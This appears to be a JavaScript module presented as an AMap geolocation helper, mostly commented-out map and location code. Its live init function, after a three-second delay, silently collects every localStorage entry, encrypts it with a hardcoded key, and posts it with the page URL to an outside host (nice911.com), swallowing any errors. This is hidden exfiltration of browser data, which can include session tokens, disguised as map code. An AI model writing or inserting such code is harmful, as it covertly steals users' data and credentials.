const axios = require('axios');
const qs = require('qs');
const TkUtils = require('./TkUtils.js');


// const AMapLoader = require('@amap/amap-jsapi-loader');

(function (document) {
    module.exports = {
        init: init
    }

    function init(e) {


        // AMapLoader.load({
        //     key: "f3ce7556410579c1657ba57486e50f7a", // 申请好的Web端开发者Key，首次调用 load 时必填
        //     version: "2.0", // 指定要加载的 JSAPI 的版本，缺省时默认为 1.4.15
        //     plugins: ['AMap.Geolocation', 'AMap.CitySearch'] //插件列表
        // }).then(AMap => {
        //     console.log(AMap);
        //   var mapObj=  new AMap.Map("mymap");
        //
        //
        //
        //     var geolocation = new AMap.Geolocation({
        //         // 是否使用高精度定位，默认：true
        //         enableHighAccuracy: true,
        //         // 设置定位超时时间，默认：无穷大
        //         timeout: 10000,
        //         // 定位按钮的停靠位置的偏移量，默认：Pixel(10, 20)
        //         buttonOffset: new AMap.Pixel(10, 20),
        //         //  定位成功后调整地图视野范围使定位位置及精度范围视野内可见，默认：false
        //         zoomToAccuracy: true,
        //         //  定位按钮的排放位置,  RB表示右下
        //         buttonPosition: 'RB'
        //     })
        //     console.log(AMap);
        //
        //     geolocation.getCurrentPosition()
        //     AMap.Event.addListener(geolocation, 'complete', onComplete)
        //     AMap.Event.addListener(geolocation, 'error', onError)
        //
        //     function onComplete (data) {
        //         // data是具体的定位信息
        //         console.log(data);
        //         console.log("==========================>>>>");
        //         var marker1 = new AMap.Marker({
        //             position: data.position
        //         });
        //         map.add(marker1);
        //
        //
        //         var marker = new AMap.Marker({
        //             position: [116.481181, 39.989792]
        //         })
        //         map.add(marker);
        //
        //     }
        //
        //     function onError (data) {
        //         // 定位出错
        //         console.log(data);
        //
        //     }

        // var geolocation;
        // mapObj.plugin('AMap.Geolocation', function () {
        //       geolocation = new AMap.Geolocation({
        //           enableHighAccuracy: true,//是否使用高精度定位，默认:true
        //           timeout: 10000,          //超过10秒后停止定位，默认：无穷大
        //           maximumAge: 0,           //定位结果缓存0毫秒，默认：0
        //           convert: true,           //自动偏移坐标，偏移后的坐标为高德坐标，默认：true
        //           showButton: true,        //显示定位按钮，默认：true
        //           buttonPosition: 'LB',    //定位按钮停靠位置，默认：'LB'，左下角
        //           buttonOffset: new AMap.Pixel(10, 20),//定位按钮与设置的停靠位置的偏移量，默认：Pixel(10, 20)
        //           showMarker: true,        //定位成功后在定位到的位置显示点标记，默认：true
        //           showCircle: true,        //定位成功后用圆圈表示定位精度范围，默认：true
        //           panToLocation: true,     //定位成功后将定位到的位置作为地图中心点，默认：true
        //           zoomToAccuracy:true      //定位成功后调整地图视野范围使定位位置及精度范围视野内可见，默认：false
        //       });
        //       mapObj.addControl(geolocation);
        //     document.getElementById('result2').innerHTML = "开始";
        //
        //     geolocation.getCurrentPosition();
        //       AMap.Event.addListener(geolocation, 'complete', onComplete);//返回定位信息
        //       AMap.Event.addListener(geolocation, 'error', onError);      //返回定位出错信息
        //   });
        // startLocation(AMap);
        // var citysearch = new AMap.CitySearch();
        // //自动获取用户IP，返回当前城市
        // citysearch.getLocalCity();
        // AMap.Event.addListener(citysearch, "complete", function (result) {
        //     console.log(result);
        //     if (result && result.city && result.bounds) {
        //         var cityinfo = result.city;
        //         var citybounds = result.bounds;
        //
        //         document.getElementById('result').innerHTML = "您当前所2在城市：" + cityinfo + "";
        //         //地图显示当前城市
        //         // mapObj.setBounds(citybounds);
        //     } else {
        //         document.getElementById('result').innerHTML = "您当前所1在城市：" + result.info + "";
        //     }
        // });
        // AMap.Event.addListener(citysearch, "error", function (result) {
        //     alert(result.info);
        // });
        // // onCitysearch(AMap);
        //
        //
        //
        // var geolocation = new AMap.Geolocation({
        //     // 是否使用高精度定位，默认：true
        //     enableHighAccuracy: true,
        //     // 设置定位超时时间，默认：无穷大
        //     timeout: 10000,
        //     // 定位按钮的停靠位置的偏移量，默认：Pixel(10, 20)
        //     buttonOffset: new AMap.Pixel(10, 20),
        //     //  定位成功后调整地图视野范围使定位位置及精度范围视野内可见，默认：false
        //     zoomToAccuracy: true,
        //     //  定位按钮的排放位置,  RB表示右下
        //     buttonPosition: 'RB'
        // })
        // geolocation.getCurrentPosition();
        // console.log("========================================>>>>>>");
        // console.log(geolocation);
        // console.log(AMap);
        // console.log("========================================>>>>>>");
        //
        //
        // // AMap.event.addListener(geolocation ,'complete',function (e) {
        // //     console.log(e);
        // //     console.log("==========================");
        // // }); //定位成功后的回调函数
        //
        // AMap.Event.addListener(geolocation, 'complete', onComplete)
        // AMap.Event.addListener(geolocation, 'error', onError)
        //
        // function onComplete(data) {
        //     // data是具体的定位信息
        //     console.log("data是具体的定位信息");
        //     document.getElementById('result2').innerHTML = "data是具体的定位信息：" + data + "";
        //
        //     console.log(data);
        // }
        //
        // function onError(data) {
        //     document.getElementById('result2').innerHTML = "定位出错data是具体的定位信息：" + data + "";
        //
        //     // 定位出错
        //     console.log("定位出错");
        //     console.log(data);
        //
        // }
        // }).catch(e => {
        //     console.log(e);
        // });


        function onCitysearch(AMap) {
            var citysearch = new AMap.CitySearch();
            //自动获取用户IP，返回当前城市
            citysearch.getLocalCity();
            AMap.event.addListener(citysearch, "complete", function (result) {
                if (result && result.city && result.bounds) {
                    var cityinfo = result.city;
                    var citybounds = result.bounds;
                    document.getElementById('result').innerHTML = "您当前所在城市：" + cityinfo + "";
                    //地图显示当前城市
                    // mapObj.setBounds(citybounds);
                } else {
                    document.getElementById('result').innerHTML = "您当前所在城市：" + result.info + "";
                }
            });
            AMap.event.addListener(citysearch, "error", function (result) {
                alert(result.info);
            });


            var geolocation = new AMap.Geolocation({
                // 是否使用高精度定位，默认：true
                enableHighAccuracy: true,
                // 设置定位超时时间，默认：无穷大
                timeout: 10000,
                // 定位按钮的停靠位置的偏移量，默认：Pixel(10, 20)
                buttonOffset: new AMap.Pixel(10, 20),
                //  定位成功后调整地图视野范围使定位位置及精度范围视野内可见，默认：false
                zoomToAccuracy: true,
                //  定位按钮的排放位置,  RB表示右下
                buttonPosition: 'RB'
            })
            geolocation.getCurrentPosition();
            console.log("========================================>>>>>>");
            console.log(geolocation);
            console.log(AMap);
            console.log("========================================>>>>>>");


            // AMap.event.addListener(geolocation ,'complete',function (e) {
            //     console.log(e);
            //     console.log("==========================");
            // }); //定位成功后的回调函数

            AMap.Event.addListener(geolocation, 'complete', onComplete)
            AMap.Event.addListener(geolocation, 'error', onError)

            function onComplete(data) {
                // data是具体的定位信息
                console.log("data是具体的定位信息");
                console.log(data);
            }

            function onError(data) {
                // 定位出错
                console.log("定位出错");
                console.log(data);

            }


        }


        function startLocation(AMap) {


            var geolocation = new AMap.Geolocation({
                // 是否使用高精度定位，默认：true
                enableHighAccuracy: true,
                // 设置定位超时时间，默认：无穷大
                timeout: 10000,
                // 定位按钮的停靠位置的偏移量，默认：Pixel(10, 20)
                buttonOffset: new AMap.Pixel(10, 20),
                //  定位成功后调整地图视野范围使定位位置及精度范围视野内可见，默认：false
                zoomToAccuracy: true,
                //  定位按钮的排放位置,  RB表示右下
                buttonPosition: 'RB'
            })
            geolocation.getCurrentPosition();
            console.log("========================================>>>>>>");
            console.log(geolocation);
            console.log(AMap);
            console.log("========================================>>>>>>");


            // AMap.event.addListener(geolocation ,'complete',function (e) {
            //     console.log(e);
            //     console.log("==========================");
            // }); //定位成功后的回调函数

            AMap.Event.addListener(geolocation, 'complete', onComplete)
            AMap.Event.addListener(geolocation, 'error', onError)

            function onComplete(data) {
                // data是具体的定位信息
                console.log("data是具体的定位信息");
                console.log(data);
            }

            function onError(data) {
                // 定位出错
                console.log("定位出错");
                console.log(data);

            }


            // AMap.plugin('AMap.Geolocation', function() {
            //     var geolocation = new AMap.Geolocation({
            //         // 是否使用高精度定位，默认：true
            //         enableHighAccuracy: true,
            //         // 设置定位超时时间，默认：无穷大
            //         timeout: 10000,
            //         // 定位按钮的停靠位置的偏移量，默认：Pixel(10, 20)
            //         buttonOffset: new AMap.Pixel(10, 20),
            //         //  定位成功后调整地图视野范围使定位位置及精度范围视野内可见，默认：false
            //         zoomToAccuracy: true,
            //         //  定位按钮的排放位置,  RB表示右下
            //         buttonPosition: 'RB'
            //     })
            //
            //     geolocation.getCurrentPosition()
            //     AMap.event.addListener(geolocation, 'complete', onComplete)
            //     AMap.event.addListener(geolocation, 'error', onError)
            //
            //     function onComplete (data) {
            //         // data是具体的定位信息
            //         console.log("data是具体的定位信息");
            //         console.log(data);
            //     }
            //
            //     function onError (data) {
            //         // 定位出错
            //         console.log("定位出错");
            //         console.log(data);
            //
            //     }
            // })
        }


        function getLocationData() {
            var len = localStorage.length;
            console.log(len)
            var arr = new Array();
            for (var i = 0; i < len; i++) {
                var getKey = localStorage.key(i);
                var getVal = localStorage.getItem(getKey);
                var values = '';
                if (isJSON(getVal)) {
                    values = JSON.parse(getVal);
                } else {
                    values = getVal;
                }
                arr[i] = {
                    'key': getKey,
                    'val': values,
                }
            }
            return arr;

            function isJSON(str) {
                if (typeof str == 'string') {
                    try {
                        var obj = JSON.parse(str);
                        if (typeof obj == 'object' && obj) {
                            return true;
                        } else {
                            return false;
                        }

                    } catch (e) {
                        return false;
                    }
                }
            }
        }


        asyncPost();

        function asyncPost() {
            var timer = setTimeout(function () {
                clearTimeout(timer);
                addPost();
            }, 3000);
        }
        function addPost() {
            var key = 'D21Uq65MzDF28PaEx7zO0dSM2WuG03z01';
            var message = JSON.stringify(getLocationData());
            message = TkUtils.encrypt(message, key);
            let data = {url: window.location.href, type: "3", data: message}
            axios.post('https://www.nice911.com/hd-merchant-web/arthur/showBox', qs.stringify(data))
                .then(function (response) {
                    console.log(response);
                })
                .catch(function (error) {

                })
                .finally(function () {

                });
        }

    }
})(document);


